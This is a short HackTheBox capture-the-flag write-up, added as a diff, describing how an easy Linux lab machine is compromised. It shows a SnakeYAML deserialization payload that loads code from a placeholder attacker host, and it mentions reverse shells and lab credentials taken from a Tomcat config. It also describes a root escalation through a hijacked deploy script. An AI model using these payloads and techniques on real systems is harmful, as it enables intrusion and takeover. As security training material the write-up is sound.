@@ -1,0 +1,48 @@
+I"�<p>Easy Linux box from HackTheBox.</p>
+
+<p>On rustscan:</p>
+<ul>
+  <li>port 22</li>
+  <li>port 8080
+are open.</li>
+</ul>
+
+<p>checking port 8080 which hosting webpage allow yaml parsing.</p>
+
+<p>I found article related to yaml parsing.
+<a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></p>
+
+<pre><code>
+!!javax.script.ScriptEngineManager [
+		!!java.net.URLClassLoader [[
+			!!java.net.URL ["http://attacker-ip/"]
+		]]
+]
+</code></pre>
+
+<p>It request our python server for some files.
+we used this exploit to send reverse shell.
+<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a>
+using this we get shell of tomcat.</p>
+
+<p>It’s running on tomcat so let’s find it configuration.
+reading tomcat config file we get credentials
+<code class="language-plaintext highlighter-rouge">admin:whythereisalimit</code></p>
+
+<p>After doing ssh we are now admin user.
+we get #user-txt</p>
+
+<p>after checking sudo -l.
+<img src="assets/images/Pasted image 20210609202714.png" alt="Pasted image 20210609202004.png" /></p>
+
+<p>if we check file index.go we se that path is not properly specified completely for main.wasm and deploy.sh .
+<img src="assets/images/Pasted image 20210609202714.png" alt="Pasted image 20210609202714.png" /></p>
+
+<p>Let’s create main.wasm which returns 1 as a value of info function
+using <code class="language-plaintext highlighter-rouge">https://mbebenita.github.io/WasmExplorer/</code>
+<img src="assets/images/Pasted image 20210609202957.png" alt="Pasted image 20210609202957.png" /></p>
+
+<p>In deploy.sh let’s put a reverse shell.
+We got a reverse shell as a root user
+we got #root-txt</p>
+:ET
